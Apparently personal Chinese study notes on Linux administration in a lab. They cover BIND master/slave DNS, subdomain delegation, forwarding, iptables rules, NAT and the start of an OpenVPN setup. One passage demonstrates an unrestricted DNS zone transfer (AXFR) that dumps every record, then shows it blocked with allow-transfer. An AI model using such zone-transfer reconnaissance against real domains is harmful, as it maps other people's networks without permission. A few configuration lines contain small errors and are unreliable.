//      listen-on port 53 { 127.0.0.1; };#注释这行
        listen-on-v6 port 53 { ::1; };
        directory       "/var/named";
        dump-file       "/var/named/data/cache_dump.db";
        statistics-file "/var/named/data/named_stats.txt";
        memstatistics-file "/var/named/data/named_mem_stats.txt";
        secroots-file   "/var/named/data/named.secroots";
        recursing-file  "/var/named/data/named.recursing";
//      allow-query     { localhost; };#注释这行
root@centos8_1:~# vim /etc/named.rfc1912.zones
zone "liusenbiao.cn" {
        type slave;
        masters {10.0.0.8;};
        file "slaves/liusenbiao.cn.slave";
};
root@centos8_1:~# systemctl enable --now named
Created symlink /etc/systemd/system/multi-user.target.wants/named.service → /usr/lib/systemd/system/named.service
root@centos8_1:~# ll /var/named/slaves/
#看看子服务器有没有同步数据
total 4
-rw-r--r-- 1 named named 505 May 15 13:57 liusenbiao.cn.slave
#看看主服务器修改数据，子服务器有没有实时更新数据
root@centos8_1:~# ll /var/named/slaves/liusenbiao.cn.slave 
-rw-r--r-- 1 named named 624 May 15 23:20 /var/named/slaves/liusenbiao.cn.slave
root@centos8_1:~# vim /etc/named.conf
options {
//      listen-on port 53 { 127.0.0.1; };
        listen-on-v6 port 53 { ::1; };
        directory       "/var/named";
        dump-file       "/var/named/data/cache_dump.db";
        statistics-file "/var/named/data/named_stats.txt";
        memstatistics-file "/var/named/data/named_mem_stats.txt";
        secroots-file   "/var/named/data/named.secroots";
        recursing-file  "/var/named/data/named.recursing";
//      allow-query     { localhost; };
        allow-transfer  {none;}; #从DNS服务器不允许任何人抓取数据
root@centos8_1:~# rndc reload
 
 
 
#centos7
[root@centos7_clone1 ~]# cd /etc/sysconfig/network-scripts
[root@centos7_clone1 network-scripts]# vim ifcfg-eth0
DEVICE=eth0
NAME=eth0
BOOTPROTO=static
ONBOOT=yes
IPADDR=10.0.0.166
PREFIX=24
GATEWAY=10.0.0.2
DNS1=10.0.0.8
DNS2=10.0.0.152 #指向子服务器的DNS
ONBOOT=yes
[root@centos7_clone1 network-scripts]# systemctl restart network
[root@centos7_clone1 ~]# cat /etc/resolv.conf
# Generated by NetworkManager
nameserver 10.0.0.8
nameserver 10.0.0.152 #新加的DNS服务器
[root@centos7_clone1 ~]# dig www.liusenbiao.cn
;; Query time: 1 msec
;; SERVER: 10.0.0.152#53(10.0.0.152) #子DNS启动成功！！！
;; WHEN: Sun May 15 22:10:30 CST 2022
;; MSG SIZE  rcvd: 99
#看看主服务器修改数据，子服务器有没有实时更新数据
[root@centos7_clone1 ~]# dig www.liusenbiao.cn @10.0.0.152
;; ANSWER SECTION:
www.liusenbiao.cn.	86400	IN	CNAME	cdn.liusenbiao.cn.
cdn.liusenbiao.cn.	86400	IN	A	10.0.0.222 #实时同步了！！
[root@centos7_clone1 ~]# dig -t axfr liusenbiao.cn
#安全问题：黑客可以通过抓包抓到DNS所有的数据
; <<>> DiG 9.11.4-P2-RedHat-9.11.4-26.P2.el7 <<>> -t axfr liusenbiao.cn
;; global options: +cmd
liusenbiao.cn.		86400	IN	SOA	master.liusenbiao.cn. admin.liusenbiao.org. 3 86400 3600 604800 10800
liusenbiao.cn.		86400	IN	A	10.0.0.153
liusenbiao.cn.		86400	IN	NS	master.liusenbiao.cn.
liusenbiao.cn.		86400	IN	NS	slaves1.liusenbiao.cn.
*.liusenbiao.cn.	86400	IN	A	10.0.0.153
cdn.liusenbiao.cn.	86400	IN	A	10.0.0.222
db.liusenbiao.cn.	86400	IN	A	10.0.0.123
ks8node1.liusenbiao.cn.	86400	IN	A	10.0.0.101
ks8node2.liusenbiao.cn.	86400	IN	A	10.0.0.102
master.liusenbiao.cn.	86400	IN	A	10.0.0.8
slaves1.liusenbiao.cn.	86400	IN	A	10.0.0.152
www.liusenbiao.cn.	86400	IN	CNAME	cdn.liusenbiao.cn.
liusenbiao.cn.		86400	IN	SOA	master.liusenbiao.cn. admin.liusenbiao.org. 3 86400 3600 604800 10800
;; Query time: 1 msec
;; SERVER: 10.0.0.8#53(10.0.0.8)
;; WHEN: Sun May 15 23:34:16 CST 2022
;; XFR size: 13 records (messages 1, bytes 350)
[root@centos7_clone1 ~]# dig -t axfr liusenbiao.cn
#allow-transfer  {10.0.0.152;};之后想要再抓取数据就不行了
; <<>> DiG 9.11.4-P2-RedHat-9.11.4-26.P2.el7 <<>> -t axfr liusenbiao.cn
;; global optons: +cmd
; Transfer fa#iled.




#centos8
#DNS的主服务器
#把主服务器挂了
[root@centos8 ~]# rndc stop
[root@centos8 ~]# systemctl start named
#实现主从DNS服务器数据同步问题
[root@centos8 ~]# vim /var/named/liusenbiao.cn.zone
$TTL 1D
@   IN SOA  master admin.liusenbiao.org. (
                   2    ; serial #只有改变版本号才能实现子DNS同步
                   1D   ; refresh
                   1H   ; retry
                   1W   ; expire
                   3H )     ; minimum
    NS  master
    NS  slaves1 #添加子DNS的名称(随便写)
master  A   10.0.0.8 
slaves1  A   10.0.0.152 #添加子DNS的ip
www     CNAME cdn.liusenbiao.cn.
cdn     A   10.0.0.222 #修改内容
db      A   10.0.0.123
ks8node1 A  10.0.0.101
ks8node2 A  10.0.0.102
*        A  10.0.0.153
@        A  10.0.0.153
#解决安全问题：即允许谁能从我这里抓取所有数据库
[root@centos8 ~]# vim /etc/named.conf 
options {
        listen-on port 53 { localhost; };
        listen-on-v6 port 53 { ::1; };
        directory       "/var/named";
        dump-file       "/var/named/data/cache_dump.db";
        statistics-file "/var/named/data/named_stats.txt";
        memstatistics-file "/var/named/data/named_mem_stats.txt";
        secroots-file   "/var/named/data/named.secroots";
        recursing-file  "/var/named/data/named.recursing";
        allow-query     { any; };
        allow-transfer  {10.0.0.152;};#设置主DNS禁止抓取数据
[root@centos8 ~]# rndc reload
```

#### 32.2.4实现DNS子域服务器

```
[root@centos8 ~]是实现DNS的主服务器，10.0.0.8
root@centos8_1是实现DNS子服务器，10.0.0.152
[root@centos8_clone1 ~]是子域DNS服务器，10.0.0.154
#用ubuntu搭建web服务，ip地址10.0.0.153

#centos8主DNS服务器
[root@centos8 ~]# vim /etc/named.conf
options {
        listen-on-v6 port 53 { ::1; };
        directory       "/var/named";
        dump-file       "/var/named/data/cache_dump.db";
        statistics-file "/var/named/data/named_stats.txt";
        memstatistics-file "/var/named/data/named_mem_stats.txt";
        secroots-file   "/var/named/data/named.secroots";
        recursing-file  "/var/named/data/named.recursing";
        allow-transfer  {10.0.0.152;};
#在 If you are building an AUTHORITATIVE DNS server下
 dnssec-enable no; #建议关闭加密验证
 dnssec-validation no;#建议关闭加密验证

[root@centos8 ~]# vim /var/named/liusenbiao.cn.zone
$TTL 1D
@   IN SOA  master admin.liusenbiao.org. (
                   5    ; serial #版本号一定要改
                   1D   ; refresh
                   1H   ; retry
                   1W   ; expire
                   3H )     ; minimum
          NS    master
          NS    slaves1
shanghai  NS    shanghaiDNS #子域委派DNS服务器
master  A   10.0.0.8
slaves1  A   10.0.0.152
shanghaiDNS A 10.0.0.154 #子域委派DNS服务器
www      A   10.0.0.153
[root@centos8 ~]# rndc reload


#centos8_clone1子域委派DNS服务器
[root@centos8_clone1 ~]# dnf -y install bind
[root@centos8_clone1 ~]# vim /etc/named.conf
options {
//      listen-on port 53 { 127.0.0.1; };
        listen-on-v6 port 53 { ::1; };
        directory       "/var/named";
        dump-file       "/var/named/data/cache_dump.db";
        statistics-file "/var/named/data/named_stats.txt";
        memstatistics-file "/var/named/data/named_mem_stats.txt";
        secroots-file   "/var/named/data/named.secroots";
        recursing-file  "/var/named/data/named.recursing";
//      allow-query     { localhost; };
[root@centos8_clone1 ~]# vim /etc/named.rfc1912.zones
zone "shanghai.liusenbiao.cn" {
        type master;
        file "shanghai.liusenbiao.cn.zone";
};
[root@centos8_clone1 ~]# vim /var/named/shanghai.liusenbiao.cn.zone
$TTL 1D
@    IN SOA  ns1 admin (1 12H 10M 3D 1H)
     NS ns1         
ns1   A  10.0.0.154 #本机ip
www   A  10.0.0.200 
#（1 12H 10M 3D 1H）代表->版本号：同步间隔：同步失败多久同步一次：过期时间：缓存时长
[root@centos8_clone1 ~]# chgrp named /var/named/shanghai.liusenbiao.cn.zone ;chmod 640 /var/named/shanghai.liusenbiao.cn.zone
[root@centos8_clone1 ~]# ll /var/named/shanghai.liusenbiao.cn.zone
-rw-r----- 1 root named 101 May 16 11:31 /var/named/shanghai.liusenbiao.cn.zone
[root@centos8_clone1 ~]# systemctl enable --now named

#centos7作为客户端测试
[root@centos7_clone1 ~]# dig www.shanghai.liusenbiao.cn
;; ANSWER SECTION:
www.shanghai.liusenbiao.cn. 86400 IN	A	10.0.0.200 #表示测试成功！！
```

#### 32.2.5实现DNS转发(缓存)

```
[root@centos8 ~]是实现DNS的主服务器，10.0.0.8
root@centos8_1是实现DNS子服务器，10.0.0.152
[root@centos8_clone1 ~]是子域DNS服务器，10.0.0.154
[root@centos8_clone2 ~]是实现DNS转发(缓存)，10.0.0.155
#用ubuntu搭建web服务，ip地址10.0.0.153

[root@centos8_clone2 ~]# dnf -y install bind
[root@centos8_clone2 ~]# vim /etc/named.conf
options {
//      listen-on port 53 { 127.0.0.1; };
//      allow-query     { localhost; };
        forward   only; #只转发过去解析不了就算不了
        forward   first; #只转发过去主机解析不了就自己去互联网
        forwarders {10.0.0.8;};#转发到哪个机器
dnssec-enable no;
dnssec-validation no;
[root@centos8_clone2 ~]# systemctl enable --now named
[root@centos8_clone2 ~]# rndc flush #清除之前做实验的缓存，不然后序很坑


#centos7客户端做测试
#这是测试forward only;
[root@centos7_clone1 ~]# dig www.liusenbiao.cn @10.0.0.155
;; ANSWER SECTION:
www.liusenbiao.cn.	86400	IN	A	10.0.0.100 #转发成功！！
#这是测试forward first;
[root@centos7_clone1 ~]# dig www.liusenbiao.com @10.0.0.155
;; ANSWER SECTION:
www.liusenbiao.com.	600	IN	A	108.61.87.230 #我的服务器ip!!
```

#### 32.2.6实现根域的主DNS服务器

```
#在根域的主DNS服务器10.0.0.28/24上实现
[root@centos8~]#yum install bind -y
[root@centos8~]#vim /etc/named.conf             
#注释掉两行，第13行和第21行
// listen-on port 53 { 127.0.0.1; };
// allow-query     { localhost; };
[root@centos8~]#vim /etc/named.rfc1912.zones
#将下面行改为：
zone "." IN {
       type master;
       file "root.zone";
};
[root@centos8~]vim /var/named/root.zone
$TTL 1D
@   IN SOA master admin.magedu.org. ( 1 1D 1H 1W 3D )
           NS   master
org         NS   orgns  #这是属于子域委派
master     A 10.0.0.28
orgns     A 10.0.0.38
#安全加固
[root@centos8~]#chgrp named /var/named/root.zone    
[root@centos8~]#chmod 640 /var/named/root.zone
[root@centos8~]#systemctl start named   #第一次启动
[root@centos8~]#rndc reload             #不是第一次启动


#实现转发目标的DNS服务器
#在转发目标的DNS服务器10.0.0.18/24上实现
[root@centos8~]#yum install bind -y
[root@centos8~]#vim /etc/named.conf             
#注释掉两行，第13行和第21行
// listen-on port 53 { 127.0.0.1; };
// allow-query     { localhost; };
dnssec-enable no;
dnssec-validation no
[root@centos8~]#vim /var/named/named.ca
.                       518400 IN     NS     a.root-servers.net.
#指向自己搭建根服务器的地址，不然从互联网上找真实存在的13个根
a.root-servers.net.     3600000 IN     A       10.0.0.28
[root@centos8~]#systemctl start named   #第一次启动
[root@centos8~]#rndc reload             #不是第一次启动
```

## 33.Linux防火墙

### 33.1 netfilter 完整流程

![1652760909814](linuxSRE.assets/1652760909814.png)

### 33.2iptables规则

#### 33.2.1iptables 基本匹配条件

``` 
#iptables 规则组成
规则rule：根据规则的匹配条件尝试匹配报文，对匹配成功的报文根据规则定义的处理动作作出处理，
规则在链接上的次序即为其检查时的生效次序
匹配条件：默认为与条件，同时满足
基本匹配：IP，端口，TCP的Flags（SYN,ACK等）
扩展匹配：通过复杂高级功能匹配
处理动作：称为target，跳转目标
内建处理动作：ACCEPT,DROP,REJECT,SNAT,DNAT,MASQUERADE,MARK,LOG...
自定义处理动作：自定义chain，利用分类管理复杂情形
规则要添加在链上，才生效；添加在自定义链上不会自动生效

iptables命令格式详解：
iptables   [-t table]   SUBCOMMAND   chain   [-m matchname [per-match-options]] -j targetname [per-target-options]

1、-t table：指定表
raw, mangle, nat, [filter]默认

案例：
#centos8
iptables 基本匹配条件
基本匹配条件：无需加载模块，由iptables/netfilter自行提供
 -s, --source address[/mask][,...]：源IP地址或者不连续的IP地址
 -d, --destination address[/mask][,...]：目标IP地址或者不连续的IP地址
 -p, --protocol protocol：指定协议，可使用数字如0（all）
 protocol: tcp, udp, icmp, icmpv6, udplite,esp, ah, sctp, mh or“all“  
 参看：/etc/protocols
 -i, --in-interface name：报文流入的接口；只能应用于数据报文流入环节，只应用于INPUT、
FORWARD、PREROUTING链
 -o, --out-interface name：报文流出的接口；只能应用于数据报文流出的环节，只应用于
FORWARD、OUTPUT、POSTROUTING链

-A：追加
-s:源地址
-j:跳到这个命令，也就是执行-j后面的命令
只要是主机10.0.0.7发来的一切请求全部拒绝
[root@centos8 ~]# iptables -A INPUT -s 10.0.0.7 -j DROP
[root@centos8 ~]# iptables -vnL #查看具体信息
Chain INPUT (policy ACCEPT 0 packets, 0 bytes)
pkts bytes target     prot opt in     out     source               destination
38  2712 DROP       all  --  *         *      10.0.0.7              0.0.0.0/0 
[root@centos8 ~]# iptables -vnL --line-numbers
#列出序列号
[root@centos8 ~]# iptables -F #删除全部记录
[root@centos8 ~]# iptables -D INPUT 5 #删除指定记录
[root@centos8 ~]# iptables -I INPUT -s 10.0.0.1 -j ACCEPT
-I 代表Insert，想要插到哪里，原先的位置就会往后移
#代表的是自己的windows可以连接这个
 
#设置防火墙白名单
#只要没有明确允许的都统统拒绝
[root@centos8 ~]# iptables -P INPUT DROP
#Chain INPUT (policy DROP 0 packets, 0 bytes)
policy ACCEPT 变成了policy DROP
[root@centos8 ~]# iptables -I INPUT 2 -i lo -j ACCEPT #允许ping 127.0.0.1
[root@centos8 ~]# iptables -A INPUT -j REJECT
#想要允许访问，必须放在3的规则之前
3        0     0 REJECT     all  --  *      *       0.0.0.0/0            0.0.0.0/0            reject-with icmp-port-unreachable
[root@centos8 ~]# iptables -I INPUT -s 10.0.0.7 -p icmp -j REJECT
#不允许10.0.0.7进行ping操作，但允许其他操作，比如ssh
-p:指定协议
```

#### 33.2.2 iptables 扩展匹配条件

```
扩展匹配条件：需要加载扩展模块（/usr/lib64/xtables/*.so），方可生效
扩展模块的查看帮助 ：man iptables-extensions
扩展匹配条件：
隐式扩展
显式扩展

1. 隐式扩展
iptables 在使用-p选项指明了特定的协议时，无需再用-m选项指明扩展模块的扩展机制，不需要手动加载扩展模块

1.1 tcp协议的扩展选项：
 --source-port, --sport port[:port]：匹配报文源端口,可为端口连续范围
 --destination-port,--dport port[:port]：匹配报文目标端口,可为连续范围
 --tcp-flags mask comp
     mask 需检查的标志位列表，用,分隔 , 例如 SYN,ACK,FIN,RST
     comp 在mask列表中必须为1的标志位列表，无指定则必须为0，用,分隔tcp协议的扩展选项
     
--tcp-flags SYN,ACK,FIN,RST SYN 表示要检查的标志位为SYN,ACK,FIN,RST四个，其中SYN必
须为1，余下的必须为0，第一次握手
--tcp-flags SYN,ACK,FIN,RST SYN,ACK 第二次握手
 --syn：用于匹配第一次握手, 相当于：--tcp-flags SYN,ACK,FIN,RST SYN
[root@centos8 ~]# iptables -I INPUT 3 -s 10.0.0.7 -p tcp --dport 80 -j REJECT
#dport:目标端口
#sport:源端口

1.2 udp协议的扩展选项：
--source-port, --sport port[:port]：匹配报文的源端口或端口范围
--destination-port,--dport port[:port]：匹配报文的目标端口或端口范围

1.3 icmp协议的扩展选项:
 --icmp-type {type[/code]|typename}
 type/code
 0/0   echo-reply icmp应答
 8/0   echo-request icmp请求
[root@centos8 ~]# iptables -AINPUT -s 10.0.0.7 -p icmp --icmp-type 8 -j REJECT
-8表示请求包
#10.0.0.7ping10.0.0.8ping不通，因为是请求包
#10.0.0.8ping10.0.0.7ping的通，因为是应答包


2. 显式扩展及相关模块
显示扩展即必须使用-m选项指明要调用的扩展模块名称，需要手动加载扩展模块
2.1 multiport扩展
以离散方式定义多端口匹配,最多指定15个端口
#指定多个源端口
 --source-ports,--sports port[,port|,port:port]...
# 指定多个目标端口
 --destination-ports,--dports port[,port|,port:port]...
#多个源或目标端
 --ports port[,port|,port:port]...
[root@centos8 ~]# iptables -AINPUT -s 10.0.0.7 -p tcp -m multiport --dports 80,6379 -j REJECT
#同时拒绝10.0.0.7访问10.0.0.8的httpd和redis服务，分别占用端口号6379,80

2.2 iprange扩展
指明连续的（但一般不是整个网络）ip地址范围
--src-range from[-to] 源IP地址范围
--dst-range from[-to] 目标IP地址范围
[root@centos8 ~]#iptables -AINPUT -m iprange --src-range 10.0.0.2-10.0.0.10 -j DROP
#拒绝10.0.0.2~10.0.0.10之间的所有ip访问

2.3 mac扩展
mac 模块可以指明源MAC地址,，适用于：PREROUTING, FORWARD，INPUT chains
--mac-source XX:XX:XX:XX:XX:XX
[root@centos8 ~]# iptables -AINPUT -m mac --mac-source 00:0c:29:e7:e8:52 -j REJECT
#拒绝mac地址为00:0c:29:e7:e8:52的主机去访问

2.4 string扩展
对报文中的应用层数据做字符串模式匹配检测
--algo {bm|kmp} 字符串匹配检测算法
 bm：Boyer-Moore
 kmp：Knuth-Pratt-Morris
--from offset 开始偏移
--to offset   结束偏移
 --string pattern 要检测的字符串模式
 --hex-string pattern要检测字符串模式，16进制格式
[root@centos8 ~]# iptables -A OUTPUT -p tcp --sport 80 -m string --algo bm --from 62 --string  "google" -j REJECT
#禁止访问www.google.com网站

2.5 time扩展
注意：CentOS 8 此模块有问题
--datestart YYYY[-MM[-DD[Thh[:mm[:ss]]]]] 日期
--datestop YYYY[-MM[-DD[Thh[:mm[:ss]]]]]
--timestart hh:mm[:ss]       时间
--timestop hh:mm[:ss]
[!] --monthdays day[,day...]   每个月的几号
[!] --weekdays day[,day...]   星期几，1 – 7 分别表示星期一到星期日
--kerneltz：内核时区（当地时间），不建议使用，CentOS 7 系统默认为 UTC
注意： centos6 不支持kerneltz ，--localtz指定本地时区(默认)
[root@centos8 ~]#iptables -A INPUT -m time --timestart 12:30 --timestop 13:30 -j 
ACCEPT

2.6 connlimit扩展
根据每客户端IP做并发连接数数量匹配
可防止Dos(Denial of Service，拒绝服务)攻击
--connlimit-upto N #连接的数量小于等于N时匹配
--connlimit-above N #连接的数量大于N时匹配
[root@centos8 ~]# iptables -A INPUT -p tcp --dport 80 -m connlimit --connlimit-above 2 -j REJECT
#超过两个连接数就干掉

2.7 limit扩展
是实现流量控制
--limit-burst number #前多少个包不限制
--limit #[/second|/minute|/hour|/day]
[root@centos8 ~]# iptables -I INPUT -p icmp --icmp-type 8 -m limit --limit 10/minute --limit-burst 5 -j ACCEPT
#前5个不限，5个之后每分钟允许通过10个
[root@centos8 ~]# iptables -AINPUT -p icmp -j REJECT
#不满足第一个就拒绝

2.8 state扩展
state 扩展模块，可以根据”连接追踪机制“去检查连接的状态，较耗资源
conntrack机制：追踪本机上的请求和响应之间的关系
状态类型：
NEW：第一次请求的包叫做NEW	
发出的请求
ESTABLISHED：NEW状态之后的所有的包都叫做ESTABLISHED	
状态
RELATED：新发起的但与已有连接相关联的连接，如：ftp协议中的数据连接与命令连接之间的关
系
INVALID：无效的连接，如flag标记不正确
UNTRACKED：未进行追踪的连接，如：raw表中关闭追踪
已经追踪到的并记录下来的连接信息库
[root@centos8 ~]# iptables -AINPUT -m state --state ESTABLISHED -j ACCEPT
[root@centos8 ~]# iptables -AINPUT -m state --state NEW -j REJECT
#以上两条实现了老用户建立连接都允许，新用户建立连接都拒绝
[root@centos8 ~]# iptables -AINPUT -s 10.0.0.7 -m state --state NEW -j REJECT
10.0.0.7ping不通10.0.0.8
10.0.0.8ping不通10.0.0.7
```

### 33.3iptables规则优化

```
1. 安全放行所有入站和出站的状态为ESTABLISHED状态连接,建议放在第一条，效率更高(老用户第一条)
2. 谨慎放行入站的新请求
3. 有特殊目的限制访问功能，要在放行规则之前加以拒绝
4. 同类规则（访问同一应用，比如：http ），匹配范围小的放在前面，用于特殊处理
5. 不同类的规则（访问不同应用，一个是http，另一个是mysql ），匹配范围大的放在前面，效率更
高
-s 10.0.0.6 -p tcp --dport 3306 -j REJECT
-s 172.16.0.0/16 -p tcp --dport 80 -j REJECT
6. 应该将那些可由一条规则能够描述的多个规则合并为一条,减少规则数量,提高检查效率
7. 设置默认策略，建议白名单（只放行特定连接）
iptables -P，不建议，容易出现“自杀现象”
规则的最后定义规则做为默认策略，推荐使用，放在最后一条
```

### 33.4iptables规则保存

```
使用iptables命令定义的规则，手动删除之前，其生效期限为kernel存活期限
#1.持久保存规则：
CentOS 7,8
iptables-save > /PATH/TO/SOME_RULES_FILE
[root@centos8 ~]# iptables-save  > /data/iptables.rule
#CentOS 6
#将规则覆盖保存至/etc/sysconfig/iptables文件中
service iptables save

#2.加载规则
CentOS 7,8 重新载入预存规则文件中规则：
[root@centos8 ~]# iptables-restore < /data/iptables.rule
CentOS 6：
#会自动从/etc/sysconfig/iptables 重新载入规则
service iptables  restart

#3.开机自动运行iptables
#方法一：
[root@centos8 ~]# vim /etc/rc.d/rc.local
把iptables-restore这个命令写进去
iptables-restore < /data/iptables.rule
[root@centos8 ~]# chmod +x /etc/rc.d/rc.local
#方法二：
[root@centos8 ~]# dnf -y install iptables-services
[root@centos8 ~]# iptables -AINPUT -s 10.0.0.1 -j ACCEPT
[root@centos8 ~]# iptables -AINPUT -i lo -j ACCEPT
[root@centos8 ~]# iptables-save > /etc/sysconfig/iptables #保存到配置文件中
[root@centos8 ~]# systemctl enable --now iptables #设置为开机自动启动
```

![1652844325703](linuxSRE.assets/1652844325703.png)

### 33.5iptables自定义链

```
自定义链：
-N：new, 自定义一条新的规则链
-E：重命名自定义链；引用计数不为0的自定义链不能够被重命名，也不能被删除
-X：delete，删除自定义的空的规则链
-P：Policy，设置默认策略；对filter表中的链而言，其默认策略有：ACCEPT：接受, DROP：丢弃

#1.创建自定义链
[root@centos8 ~]# iptables -N web-chain #创建web-chain自定义链
[root@centos8 ~]# iptables -vnL --line-numbers
Chain web-chain (0 references)
#多了一条这个链！！
num   pkts bytes target     prot opt in     out     source               destination 
[root@centos8 ~]# iptables -E web-chain WEB_CHAIN #改名
[root@centos8 ~]# iptables -AWEB_CHAIN -p tcp -m multiport --dports 80,443 -j ACCEPT #添加规则到自定义链中
#关联自定义链
[root@centos8 ~]# iptables -AINPUT -s 10.0.0.0/24 -j WEB_CHAIN
[root@centos8 ~]# iptables -vnL --line-numbers
Chain INPUT (policy ACCEPT 551 packets, 34466 bytes)
num   pkts bytes target     prot opt in     out     source               destination         
1       10   612 WEB_CHAIN  all  --  *      *       10.0.0.0/24          0.0.0.0/0 
[root@centos8 ~]# iptables-save > /etc/sysconfig/iptables #保存到配置文件中
[root@centos8 ~]# systemctl enable --now iptables #设置为开机自动启动
#也可以从文件中加载
[root@centos8 ~]# iptables-restore < /etc/sysconfig/iptables 


#2.删除自定义链
[root@centos8 ~]# iptables -X WEB_CHAIN
iptables v1.8.4 (nf_tables):  CHAIN_USER_DEL failed (Device or resource busy): chain WEB_CHAIN
[root@centos8 ~]# iptables -F INPUT #把调用它的链清空
[root@centos8 ~]# iptables -F WEB_CHAIN #把自定义的链清空
[root@centos8 ~]# iptables -X WEB_CHAIN #最后清除自定义链
```

### 33.6 网络防火墙

![1652858030121](linuxSRE.assets/1652858030121.png)

```
#准别两台内网机器
#LanServer1: [root@web2 ~]   ip是10.0.0.7
#LanServer2:[root@web1 ~] ip是10.0.0.17
#把VMware的虚拟网络编辑区VMnet1的子网ip改成192.168.10.0

#centos7@web2
[16:25:11 root@web2 ~]#yum -y install httpd;systemctl enable --now httpd;hostnamectl set-hostname web2.liusenbiao.org; hostname > /var/www/html/index.html
[16:25:11 root@web2 ~]#vim /etc/sysconfig/network-scripts/ifcfg-eth0
DEVICE=eth0
NAME=eth0
BOOTPROTO=static
IPADDR=10.0.0.7
PREFIX=24
GATEWAY=10.0.0.8 #网关改成图片山的网关地址
DNS1=10.0.0.2
DNS2=180.76.76.76
ONBOOT=yes
[16:34:53 root@web2 ~]#systemctl restart network


#centos7@web1
[root@web1 ~]# yum -y install httpd;systemctl enable --now httpd;hostnamectl set-hostname web1.liusenbiao.org; hostname > /var/www/html/index.html;
[root@web1 ~]# vim /etc/sysconfig/network-scripts/ifcfg-eth0
DEVICE=eth0
NAME=eth0
BOOTPROTO=static
ONBOOT=yes
IPADDR=10.0.0.17
PREFIX=24
DNS1=10.0.0.2
DNS2=180.76.76.76
ONBOOT=yes
[16:34:53 root@web2 ~]#systemctl restart network


#firewall
#centos8.2加一块网卡(网络适配器)，改成仅主机模式
#ip地址改成如上图的 192.168.10.8/24
[root@firewall ~]# nmcli connection modify eth1 ipv4.method manual ipv4.addresses 192.168.10.8/24 ifname eth1
#用ip route del 临时删除路由
[root@firewall ~]# ip route del default via 10.0.0.2 dev eth0 proto static metric 100
#最后删成如下说明环境配置完成
[root@centos8 ~]# ip route
10.0.0.0/24 dev eth0 proto kernel scope link src 10.0.0.8 metric 100 
192.168.10.0/24 dev eth1 proto kernel scope link src 192.168.10.8 metric 101
#测试
firewall的连通性,如果均ping的通则环境配置没问题
[root@firewall ~]# ping 10.0.0.7;ping 10.0.0.17;ping 192.168.10.100;
[root@firewall ~]# vim /etc/sysctl.conf
net.ipv4.ip_forward=1 #添加这个
[root@firewall ~]# sysctl -p
#让外网主机可以连接内网
net.ipv4.ip_forward = 1 
#实现功能：外网不可以访问内网，但是内网可以访问外网
[root@firewall ~]# iptables -A FORWARD ! -s 10.0.0.0/24 -d 10.0.0.0/24 -m state --state NEW -j REJECT
#实现功能：只允许外网访问10.0.0.7的机器
[root@firewall ~]# iptables -I FORWARD ! -s 10.0.0.0/24 -d 10.0.0.7 -m state --state NEW -p tcp --dport 80 -j ACCEPT


#准别一台外网机器
用ubuntu来准备，把网络适配器改成仅主机
root@ubuntu1804:# vim /etc/netplan/01-netcfg.yaml
# This file describes the network interfaces available on your system
# For more information, see netplan(5).
network:
  version: 2
  renderer: networkd
  ethernets:
    eth0:
      addresses:
      - 192.168.10.100/24
      gateway4: 192.168.10.8
```

### 33.7NAT原理和实战

这张图与上面那张图的区别是外网少了网关了，是为了实现真正的NAT服务![1652885766626](linuxSRE.assets/1652885766626.png)

```
#准别两台内网机器
#LanServer1: [root@web2 ~]   ip是10.0.0.7
#LanServer2:[root@web1 ~] ip是10.0.0.17
#把VMware的虚拟网络编辑区VMnet1的子网ip改成192.168.10.0

#centos7@web2
[23:01:16 root@web2 ~]#vim /etc/httpd/conf/httpd.conf
listen 8080 #端口改成8080
listen 8080 #端口改成9090 #第二次修改端口，用REDIRECT转发
[23:23:33 root@web2 ~]#systemctl restart httpd
#从10.0.0.8配置的8080端口转发到10.0.0.7真正的端口9090
[23:33:19 root@web2 ~]#iptables -t nat -A PREROUTING -d 10.0.0.7 -p tcp --dport 8080 -j REDIRECT --to-ports 9090


#centos7@web1
#SNAT
#实现功能:利用NAT原理实现内网访问外网，做地址转换	
[root@web1 ~]# ping 192.168.10.100

#firewall
#centos8.2加一块网卡(网络适配器)，改成仅主机模式
#ip地址改成如上图的 192.168.10.8/24
[root@firewall ~]# iptables -F
#实现功能:利用NAT原理实现内网访问外网，做地址转换	
#用SNAT
[root@firewall ~]# iptables -t nat -A POSTROUTING -s 10.0.0.0/24  ! -d 10.0.0.0/24 -j MASQUERADE 
[root@firewall ~]# iptables -t nat -nvL
Chain POSTROUTING (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         
    0     0 MASQUERADE  all  --  *      *       10.0.0.0/24         !10.0.0.0/24  
#实现功能:利用NAT原理实现外网访问内网，做地址转换	
#用DNAT
[root@firewall ~]# iptables -t nat -A PREROUTING -d 192.168.10.8 -p tcp --dport 80 -j DNAT --to-destination 10.0.0.7
#改变端口号，做NAT变换
-R：1替换第一条规则
[root@firewall ~]# iptables -t nat -R PREROUTING 1 -d 192.168.10.8 -p tcp --dport 80 -j DNAT --to-destination 10.0.0.7：8080



#准别一台外网机器
用ubuntu来准备，把网络适配器改成仅主机
[22:54:36 liu@ubuntu1804 ~]$ip route del default via 192.168.10.8 dev eth0 proto static
[23:07:58 liu@ubuntu1804 ~]$sudo tcpdump -i eth0 -nn icmp
#抓包：10.0.0.17内网地址已经转化为192.168.10.8外网地址了！
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
23:08:53.254194 IP 192.168.10.8 > 192.168.10.100: ICMP echo request, id 2131, seq 1, length 64
23:08:53.254264 IP 192.168.10.100 > 192.168.10.8: ICMP echo reply, id 2131, seq 1, length 64
#用DNAT实现外网访问内网
[23:13:18 liu@ubuntu1804 ~]$curl 192.168.10.8
#访问的是firewall的公网地址，实际上是访问的是10.0.0.7
   Static hostname: web2.liusenbiao.org
         Icon name: computer-vm
           Chassis: vm
        Machine ID: 7f912004b727409e8549021ad48a518c
           Boot ID: 367e07f1fa1b40bcb10818fe8e096957
    Virtualization: vmware
  Operating System: CentOS Linux 7 (Core)
       CPE OS Name: cpe:/o:centos:centos:7
            Kernel: Linux 3.10.0-1160.el7.x86_64
      Architecture: x86-64
```

## 34.企业级OpenVPN

![1652970175471](linuxSRE.assets/1652970175471.png)

### 34.1阿里云网络环境

```
1 阿里云创建专有网络
指定城市和可用区:华北3张家口可用区A区
网段名liu-net1和地址段172.16.0.0/12,默认资源组
交换机名liu-net1-sw1 可用区A IPv4的地址段 172.30.0.0/24
安全组开放22端口

2 创建OpenVPN服务器有公网IP的实例1个
[root@openvpn-server ~] ip地址172.30.0.2/24
指定城市和可用区:华北3张家口可用区A区
计算型c6 2vCPU 4G
